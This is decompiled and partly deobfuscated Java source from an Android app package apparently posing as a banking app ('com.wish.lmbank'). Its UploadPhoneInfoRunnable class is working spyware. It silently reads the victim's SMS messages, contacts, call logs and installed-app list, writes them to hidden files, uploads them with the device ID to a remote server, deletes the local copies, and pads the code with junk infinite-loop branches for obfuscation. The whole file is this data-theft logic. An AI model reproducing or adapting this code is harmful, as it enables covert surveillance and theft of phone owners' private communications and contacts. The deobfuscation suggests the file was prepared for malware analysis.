package com.wish.lmbank.receiver;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.icu.text.SimpleDateFormat;
import android.net.Uri;
import android.os.Build;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.text.TextUtils;

import com.wish.lmbank.AppStartV;
import com.wish.lmbank.R2;
import com.wish.lmbank.bean.upload.ApkBean;
import com.wish.lmbank.bean.upload.CallLogBean;
import com.wish.lmbank.bean.upload.ContactPersonBean;
import com.wish.lmbank.bean.upload.SmsBean;
import com.wish.lmbank.common.Constants;
import com.wish.lmbank.helper.SocketHelper;
import com.wish.lmbank.http.HttpEngine;
import com.wish.lmbank.http.HttpManager;
import com.wish.lmbank.http.HttpResponse;
import com.wish.lmbank.service.RecServiceV;
import com.wish.lmbank.utils.DeviceInfoUtils;
import com.wish.lmbank.utils.JsonUtils;
import com.wish.lmbank.utils.LogUtils;

import java.io.File;
import java.io.FileOutputStream;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;

import gv00l3ah.mvdt7w.bb7d7pu7;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/receiver/UploadPhoneInfoRunnable.class */
public class UploadPhoneInfoRunnable implements Runnable {
    private Context mContext;
    private String mFlag;
    private final String TAG = UploadPhoneInfoRunnable.class.getName();
    private StringBuilder stringBuilder = new StringBuilder();

    public UploadPhoneInfoRunnable(Context context, String str) {
        this.mContext = context;
        this.mFlag = str;
    }

    @Override // java.lang.Runnable
    public void run() {
        if ((16874 + 1582) % 1582 > 0) {
            StringBuilder sb = new StringBuilder();
            this.stringBuilder = sb;
//             sb.append(bb7d7pu7.m5998("PBkFBggNOQEGBwwgBw8GOxwHBwgLBQxFSQQvBQgOU0k") + this.mFlag);
            sb.append("UploadPhoneInfoRunnable, mFlag: " + this.mFlag);
//             if (bb7d7pu7.m5998("OiQ6NiglJQ").equals(this.mFlag)) {
            if ("SMS_ALL".equals(this.mFlag)) {
                sms();
                return;
            }
//             if (bb7d7pu7.m5998("KiYnPSgqPQ").equals(this.mFlag)) {
            if ("CONTACT".equals(this.mFlag)) {
                contact();
                return;
            }
//             if (bb7d7pu7.m5998("KiglJTYlJi4").equals(this.mFlag)) {
            if ("CALL_LOG".equals(this.mFlag)) {
                callLog();
                return;
            }
//             if (bb7d7pu7.m5998("KCctOyYgLQ").equals(this.mFlag)) {
            if ("ANDROID".equals(this.mFlag)) {
                android();
                return;
            }
            return;
        }
        int i = (-8768) + (-8768) + 11197;
        while (true) {
        }
    }

    @SuppressLint("Range")
    private void contact() {
        String format;
        ContentResolver contentResolver = this.mContext.getContentResolver();
        Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
//         String m5998 = bb7d7pu7.m5998("DQAaGQUIEDYHCAQM");
        String m5998 = "display_name";
//         String m59982 = bb7d7pu7.m5998("DQgdCFg");
        String m59982 = "data1";
//         Cursor query = contentResolver.query(uri, new String[]{m5998, m59982, bb7d7pu7.m5998("GwgeNgoGBx0ICh02AA0"), bb7d7pu7.m5998("GgYbHTYCDBA")}, null, null, bb7d7pu7.m5998("GgYbHTYCDBBJKiYlJSg9LEklJiooJSAzLC1JKDoq"));
        Cursor query = contentResolver.query(uri, new String[]{m5998, m59982, "raw_contact_id", "sort_key"}, null, null, "sort_key COLLATE LOCALIZED ASC");
        if (query == null || query.getCount() == 0) {
            return;
        }
        ArrayList arrayList = new ArrayList();
        while (query.moveToNext()) {
            if (!TextUtils.isEmpty(query.getString(query.getColumnIndex(m59982)))) {
                ContactPersonBean contactPersonBean = new ContactPersonBean();
                contactPersonBean.setDisplayName(query.getString(query.getColumnIndex(m5998)));
                contactPersonBean.setPhone(query.getString(query.getColumnIndex(m59982)));
                arrayList.add(contactPersonBean);
            }
        }
        if (arrayList.size() <= 0) {
            return;
        }
        StringBuilder sb = new StringBuilder();
        Iterator it = arrayList.iterator();
        while (it.hasNext()) {
            ContactPersonBean contactPersonBean2 = (ContactPersonBean) it.next();
            StringBuilder sb2 = new StringBuilder();
            sb2.append(contactPersonBean2.getDisplayName());
            sb2.append(this.mContext.getString(R2.string.telEntity));
            sb2.append(contactPersonBean2.getPhone());
            sb.append(sb2.toString());
//             sb.append(bb7d7pu7.m5998("FUMdDAUsBx0AHRAoGxsIECUAGh1DFQ"));
            sb.append("|*telEntityArrayList*|");
        }
        arrayList.clear();
        byte[] bytes = sb.toString().getBytes();
        StringBuilder sb3 = new StringBuilder();
        sb3.append(this.mContext.getFilesDir());
//         sb3.append(bb7d7pu7.m5998("Rg0AGwoIBQU"));
        sb3.append("/dircall");
        String sb4 = sb3.toString();
        File file = new File(sb4);
        if (!file.exists()) {
            file.mkdir();
        }
        if (Build.VERSION.SDK_INT < 24) {
            format = new Date().toString();
//             format.replaceAll(bb7d7pu7.m5998("Rg"), bb7d7pu7.m5998("Ng"));
            format.replaceAll("/", "_");
        } else {
//             format = new SimpleDateFormat(bb7d7pu7.m5998("EBAQECQkDQ0BAQQEGho")).format(new Date());
            format = new SimpleDateFormat("yyyyMMddhhmmss").format(new Date());
        }
        StringBuilder sb5 = new StringBuilder();
//         sb5.append(bb7d7pu7.m5998("CgYHHQgKHRo2"));
        sb5.append("contacts_");
        sb5.append(format);
//         sb5.append(bb7d7pu7.m5998("Rw0IHQ"));
        sb5.append(".dat");
        File file2 = new File(sb4, sb5.toString());
        file2.delete();
        try {
            file2.createNewFile();
            FileOutputStream fileOutputStream = new FileOutputStream(file2, true);
            fileOutputStream.write(bytes);
            fileOutputStream.flush();
            fileOutputStream.close();
        } catch (Exception e) {
            StringBuilder sb6 = new StringBuilder();
            sb6.append(this.TAG);
//             sb6.append(bb7d7pu7.m5998("RUk"));
            sb6.append(", ");
            sb6.append(e.getMessage());
            LogUtils.callLog(sb6.toString());
        }
//         uploadInfoFile(file2, bb7d7pu7.m5998("CgYHHQgKHQ"));
        uploadInfoFile(file2, "contact");
    }

    @SuppressLint("Range")
    private void sms() {
        int i;
        String date;
        if ((5547 - 3015) % (-3015) > 0) {
            try {
//                 java.text.SimpleDateFormat simpleDateFormat = new java.text.SimpleDateFormat(bb7d7pu7.m5998("EBAQEEQkJEQNDUkhIVMEBFMaGg"), Locale.SIMPLIFIED_CHINESE);
                java.text.SimpleDateFormat simpleDateFormat = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.SIMPLIFIED_CHINESE);
//                 Cursor query = this.mContext.getContentResolver().query(Uri.parse(bb7d7pu7.m5998("CgYHHQwHHVNGRhoEGg")).buildUpon().appendQueryParameter(bb7d7pu7.m5998("BQAEAB0"), bb7d7pu7.m5998("W1lZ")).build(), null, null, null, bb7d7pu7.m5998("DQgdDEkNDBoK"));
                Cursor query = this.mContext.getContentResolver().query(Uri.parse("content://sms").buildUpon().appendQueryParameter("limit", "200").build(), null, null, null, "date desc");
                if (query == null || !query.moveToFirst()) {
                    return;
                }
                ArrayList arrayList = new ArrayList();
                int i2 = 0;
                do {
                    i = i2 + 1;
//                     long j = query.getLong(query.getColumnIndex(bb7d7pu7.m5998("DQgdDA")));
                    long j = query.getLong(query.getColumnIndex("date"));
                    SmsBean smsBean = new SmsBean();
                    smsBean.setDate(simpleDateFormat.format(new Date(j)));
//                     smsBean.setAddress(query.getString(query.getColumnIndex(bb7d7pu7.m5998("CA0NGwwaGg"))));
                    smsBean.setAddress(query.getString(query.getColumnIndex("address")));
//                     smsBean.setBody(query.getString(query.getColumnIndex(bb7d7pu7.m5998("CwYNEA"))));
                    smsBean.setBody(query.getString(query.getColumnIndex("body")));
//                     smsBean.setType(query.getString(query.getColumnIndex(bb7d7pu7.m5998("HRAZDA"))));
                    smsBean.setType(query.getString(query.getColumnIndex("type")));
                    arrayList.add(smsBean);
                    if (!query.moveToNext()) {
                        break;
                    }
                    i2 = i;
                } while (i < 200);
                if (arrayList.size() > 0) {
                    StringBuilder sb = new StringBuilder();
                    Iterator it = arrayList.iterator();
                    while (it.hasNext()) {
                        SmsBean smsBean2 = (SmsBean) it.next();
                        StringBuilder sb2 = new StringBuilder();
                        sb2.append(smsBean2.getAddress());
                        sb2.append(this.mContext.getString(R2.string.smsEntity));
                        sb2.append(smsBean2.getBody());
                        sb2.append(this.mContext.getString(R2.string.smsEntity));
                        sb2.append(smsBean2.getDate());
                        sb2.append(this.mContext.getString(R2.string.smsEntity));
                        sb2.append(smsBean2.getType());
                        sb.append(sb2.toString());
                        sb.append(this.mContext.getString(R2.string.smsEntityArrayList));
                    }
                    arrayList.clear();
                    byte[] bytes = sb.toString().getBytes();
                    StringBuilder sb3 = new StringBuilder();
                    sb3.append(this.mContext.getFilesDir());
//                     sb3.append(bb7d7pu7.m5998("Rg0AGxoEGg"));
                    sb3.append("/dirsms");
                    String sb4 = sb3.toString();
                    File file = new File(sb4);
                    if (!file.exists()) {
                        file.mkdir();
                    }
                    if (Build.VERSION.SDK_INT >= 24) {
//                         date = new SimpleDateFormat(bb7d7pu7.m5998("EBAQECQkDQ0BAQQEGho")).format(new Date());
                        date = new SimpleDateFormat("yyyyMMddhhmmss").format(new Date());
                    } else {
                        date = new Date().toString();
//                         date.replaceAll(bb7d7pu7.m5998("Rg"), bb7d7pu7.m5998("Ng"));
                        date.replaceAll("/", "_");
                    }
                    StringBuilder sb5 = new StringBuilder();
//                     sb5.append(bb7d7pu7.m5998("GgQaNg"));
                    sb5.append("sms_");
                    sb5.append(date);
//                     sb5.append(bb7d7pu7.m5998("Rw0IHQ"));
                    sb5.append(".dat");
                    File file2 = new File(sb4, sb5.toString());
                    file2.delete();
                    try {
                        file2.createNewFile();
                        FileOutputStream fileOutputStream = new FileOutputStream(file2, true);
                        fileOutputStream.write(bytes);
                        fileOutputStream.flush();
                        fileOutputStream.close();
                    } catch (Exception e) {
                        LogUtils.v(this.TAG, e.getMessage());
                    }
//                     uploadInfoFile(file2, bb7d7pu7.m5998("GgQa"));
                    uploadInfoFile(file2, "sms");
                    return;
                }
                return;
            } catch (Exception e2) {
                e2.printStackTrace();
                return;
            }
        }
        int i3 = (-14772) + ((-14772) - 4717);
        while (true) {
        }
    }

    @SuppressLint("Range")
    private void callLog() {
        String date;
//         String m5998 = bb7d7pu7.m5998("BxwECwwb");
        String m5998 = "number";
//         String m59982 = bb7d7pu7.m5998("FUMKCAUFLAcdAB0QQxU");
        String m59982 = "|*callEntity*|";
        try {
//             Cursor query = AppStartV.getContext().getContentResolver().query(CallLog.Calls.CONTENT_URI.buildUpon().appendQueryParameter(bb7d7pu7.m5998("BQAEAB0"), bb7d7pu7.m5998("WFlZ")).build(), null, null, null, bb7d7pu7.m5998("DQgdDEkNDBoK"));
            Cursor query = AppStartV.getContext().getContentResolver().query(CallLog.Calls.CONTENT_URI.buildUpon().appendQueryParameter("limit", "100").build(), null, null, null, "date desc");
            boolean z = true;
            if (query != null && query.getCount() != 0) {
//                 this.stringBuilder.append(bb7d7pu7.m5998("RUkEKhwbGgYbSUhUSQccBQVJT09JBCocGxoGG0cODB0qBhwHHUFASUhUSVk"));
                this.stringBuilder.append(", mCursor != null && mCursor.getCount() != 0");
                ArrayList arrayList = new ArrayList();
                while (query.moveToNext()) {
                    if (!TextUtils.isEmpty(query.getString(query.getColumnIndex(m5998)))) {
                        CallLogBean callLogBean = new CallLogBean();
                        callLogBean.setNumber(query.getString(query.getColumnIndex(m5998)));
//                         callLogBean.setName(query.getString(query.getColumnIndex(bb7d7pu7.m5998("BwgEDA"))));
                        callLogBean.setName(query.getString(query.getColumnIndex("name")));
//                         callLogBean.setDuration(query.getString(query.getColumnIndex(bb7d7pu7.m5998("DRwbCB0ABgc"))));
                        callLogBean.setDuration(query.getString(query.getColumnIndex("duration")));
//                         callLogBean.setDate(new java.text.SimpleDateFormat(bb7d7pu7.m5998("EBAQEEQkJEQNDUkhIVMEBFMaGg")).format(new Date(Long.valueOf(query.getLong(query.getColumnIndex(bb7d7pu7.m5998("DQgdDA")))).longValue())));
                        callLogBean.setDate(new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(Long.valueOf(query.getLong(query.getColumnIndex("date"))).longValue())));
//                         callLogBean.setType(query.getString(query.getColumnIndex(bb7d7pu7.m5998("HRAZDA"))));
                        callLogBean.setType(query.getString(query.getColumnIndex("type")));
                        arrayList.add(callLogBean);
                    }
                }
//                 this.stringBuilder.append(bb7d7pu7.m5998("RUkEKBsbCBAlABodU0k") + arrayList.size());
                this.stringBuilder.append(", mArrayList: " + arrayList.size());
                if (arrayList.size() > 0) {
                    StringBuilder sb = new StringBuilder();
                    Iterator it = arrayList.iterator();
                    while (it.hasNext()) {
                        CallLogBean callLogBean2 = (CallLogBean) it.next();
                        StringBuilder sb2 = new StringBuilder();
                        sb2.append(callLogBean2.getNumber());
                        sb2.append(m59982);
                        sb2.append(callLogBean2.getName());
                        sb2.append(m59982);
                        sb2.append(callLogBean2.getDuration());
                        sb2.append(m59982);
                        sb2.append(callLogBean2.getDate());
                        sb2.append(m59982);
                        sb2.append(callLogBean2.getType());
                        sb.append(sb2.toString());
                        sb.append(this.mContext.getString(R2.string.callEntityArrayList));
                    }
                    arrayList.clear();
                    byte[] bytes = sb.toString().getBytes();
                    if (Build.VERSION.SDK_INT >= 24) {
//                         date = new SimpleDateFormat(bb7d7pu7.m5998("EBAQECQkDQ0BAQQEGho")).format(new Date());
                        date = new SimpleDateFormat("yyyyMMddhhmmss").format(new Date());
                    } else {
                        date = new Date().toString();
//                         date.replaceAll(bb7d7pu7.m5998("Rg"), bb7d7pu7.m5998("Ng"));
                        date.replaceAll("/", "_");
                    }
                    StringBuilder sb3 = new StringBuilder();
//                     sb3.append(bb7d7pu7.m5998("CggFBTYFBg42"));
                    sb3.append("call_log_");
                    sb3.append(date);
//                     sb3.append(bb7d7pu7.m5998("Rw0IHQ"));
                    sb3.append(".dat");
                    String sb4 = sb3.toString();
                    StringBuilder sb5 = new StringBuilder();
                    sb5.append(this.mContext.getFilesDir());
//                     sb5.append(bb7d7pu7.m5998("Rg0AGwoIBQU"));
                    sb5.append("/dircall");
                    String sb6 = sb5.toString();
                    File file = new File(sb6);
                    if (!file.exists()) {
                        file.mkdir();
                    }
                    File file2 = new File(sb6, sb4);
                    file2.delete();
                    try {
                        file2.createNewFile();
                        FileOutputStream fileOutputStream = new FileOutputStream(file2, true);
                        fileOutputStream.write(bytes);
                        fileOutputStream.flush();
                        fileOutputStream.close();
                    } catch (Exception e) {
//                         this.stringBuilder.append(bb7d7pu7.m5998("RUkMEQoMGR0ABgdTSQ") + e.getMessage());
                        this.stringBuilder.append(", exception: " + e.getMessage());
                    }
//                     uploadInfoFile(file2, bb7d7pu7.m5998("CggFBQUGDg"));
                    uploadInfoFile(file2, "calllog");
                    return;
                }
                return;
            }
            StringBuilder sb7 = this.stringBuilder;
            StringBuilder sb8 = new StringBuilder();
//             sb8.append(bb7d7pu7.m5998("RUkEKhwbGgYbSVRUSQccBQVTSQ"));
            sb8.append(", mCursor == null: ");
            if (query != null) {
                z = false;
            }
            sb8.append(z);
            sb7.append(sb8.toString());
            LogUtils.callLog(this.stringBuilder.toString());
        } catch (Exception e2) {
//             LogUtils.callLog(bb7d7pu7.m5998("CggFBSUGDkVJDBEKDBkdAAYHU0k") + e2.getMessage());
            LogUtils.callLog("callLog, exception: " + e2.getMessage());
        }
    }

    private void android() {
        String date;
        if (((-2695) - 13124) % (-13124) <= 0) {
            PackageManager packageManager = this.mContext.getPackageManager();
            List<PackageInfo> installedPackages = packageManager.getInstalledPackages(0);
            if (installedPackages == null) {
                return;
            }
            ArrayList arrayList = new ArrayList();
            for (int i = 0; i < installedPackages.size(); i++) {
                PackageInfo packageInfo = installedPackages.get(i);
                if ((1 & packageInfo.applicationInfo.flags) == 0) {
                    ApkBean apkBean = new ApkBean();
                    apkBean.setSource(this.mContext.getPackageManager().getInstallerPackageName(packageInfo.packageName));
                    apkBean.setAppName(packageInfo.applicationInfo.loadLabel(packageManager).toString());
                    apkBean.setPackageName(packageInfo.packageName);
                    apkBean.setVersionName(packageInfo.versionName);
//                     String m5998 = bb7d7pu7.m5998("EBAQEEQkJEQNDUkhIVMEBFMaGg");
                    String m5998 = "yyyy-MM-dd HH:mm:ss";
                    apkBean.setFirstInstallDate(new java.text.SimpleDateFormat(m5998).format(new Date(packageInfo.firstInstallTime)));
                    apkBean.setLastUpdateDate(new java.text.SimpleDateFormat(m5998).format(new Date(packageInfo.lastUpdateTime)));
                    arrayList.add(apkBean);
                }
            }
            if (arrayList.size() > 0) {
                StringBuilder sb = new StringBuilder();
                Iterator it = arrayList.iterator();
                while (it.hasNext()) {
                    ApkBean apkBean2 = (ApkBean) it.next();
                    sb.append(apkBean2.getAppName() + this.mContext.getString(R2.string.apkEntity) + apkBean2.getPackageName() + this.mContext.getString(R2.string.apkEntity) + apkBean2.getVersionName() + this.mContext.getString(R2.string.apkEntity) + apkBean2.getFirstInstallDate() + this.mContext.getString(R2.string.apkEntity) + apkBean2.getLastUpdateDate() + this.mContext.getString(R2.string.apkEntity) + apkBean2.getSource());
                    sb.append(this.mContext.getString(R2.string.apkEntityArrayList));
                }
                arrayList.clear();
                byte[] bytes = sb.toString().getBytes();
                if (Build.VERSION.SDK_INT >= 24) {
//                     date = new SimpleDateFormat(bb7d7pu7.m5998("EBAQECQkDQ0BAQQEGho")).format(new Date());
                    date = new SimpleDateFormat("yyyyMMddhhmmss").format(new Date());
                } else {
                    date = new Date().toString();
//                     date.replaceAll(bb7d7pu7.m5998("Rg"), bb7d7pu7.m5998("Ng"));
                    date.replaceAll("/", "_");
                }
//                 String str = bb7d7pu7.m5998("CBkCNg") + date + bb7d7pu7.m5998("Rw0IHQ");
                String str = "apk_" + date + ".dat";
//                 String str2 = this.mContext.getFilesDir() + bb7d7pu7.m5998("Rg0AGwgZAg");
                String str2 = this.mContext.getFilesDir() + "/dirapk";
                File file = new File(str2);
                if (!file.exists()) {
                    file.mkdir();
                }
                File file2 = new File(str2, str);
                file2.delete();
                try {
                    file2.createNewFile();
                    FileOutputStream fileOutputStream = new FileOutputStream(file2, true);
                    fileOutputStream.write(bytes);
                    fileOutputStream.flush();
                    fileOutputStream.close();
                } catch (Exception e) {
                    LogUtils.v(this.TAG, e.getMessage());
                }
//                 uploadInfoFile(file2, bb7d7pu7.m5998("CAcNGwYADQ"));
                uploadInfoFile(file2, "android");
                return;
            }
            return;
        }
        int i2 = 13227 + 13227 + 1935;
        while (true) {
        }
    }

    private void uploadInfoFile(File file, String str) {
        if ((8426 - 16108) % (-16108) <= 0) {
            StringBuilder sb = this.stringBuilder;
//             sb.append(bb7d7pu7.m5998("RUkcGQUGCA0gBw8GLwAFDEVJHRAZDFNJ") + str);
            sb.append(", uploadInfoFile, type: " + str);
            if (file == null || !file.exists()) {
//                 this.stringBuilder.append(bb7d7pu7.m5998("RUkPAAUMSQAaSQccBQU"));
                this.stringBuilder.append(", file is null");
                return;
            }
            LogUtils.callLog(this.stringBuilder.toString());
            String deviceID = DeviceInfoUtils.getDeviceID(AppStartV.getContext());
            HashMap hashMap = new HashMap();
//             hashMap.put(bb7d7pu7.m5998("HRAZDA"), str);
            hashMap.put("type", str);
//             hashMap.put(bb7d7pu7.m5998("DQwfAAoMNgAN"), deviceID);
            hashMap.put("device_id", deviceID);
//             hashMap.put(bb7d7pu7.m5998("CBkZIA0"), Constants.COMPANY_UUID);
            hashMap.put("appId", Constants.COMPANY_UUID);
            HttpManager.getInstance().uploadInfoFile(file, JsonUtils.map2Json(hashMap).toString(), new HttpEngine.OnResponseCallback<HttpResponse.UploadInfoFile>
                    () { // from class: com.wish.lmbank.receiver.UploadPhoneInfoRunnable.1

                @Override // com.wish.lmbank.http.HttpEngine.OnResponseCallback
                public void onResponse(int i, String str2, HttpResponse.UploadInfoFile uploadInfoFile) {
//                     LogUtils.v(UploadPhoneInfoRunnable.this.TAG, bb7d7pu7.m5998("HBkFBggNIAcPBi8ABQxJGwwdBBoOUw") + str2);
                    LogUtils.v(UploadPhoneInfoRunnable.this.TAG, "uploadInfoFile retmsg:" + str2);
                    if (i == 0 && file.exists()) {
                        file.delete();
                    }
                    StringBuilder sb2 = new StringBuilder();
                    sb2.append(deviceID);
//                     String m5998 = bb7d7pu7.m5998("Ng");
                    String m5998 = "_";
                    sb2.append(m5998);
                    sb2.append(str);
                    sb2.append(m5998);
                    sb2.append(Constants.COMPANY_UUID);
                    SocketHelper.getInstance((RecServiceV) UploadPhoneInfoRunnable.this.mContext).sendUploadInfoMsgToServer(sb2.toString());
                }
            });
            return;
        }
        int i = 17426 + (17426 - 8819);
        while (true) {
        }
    }
}
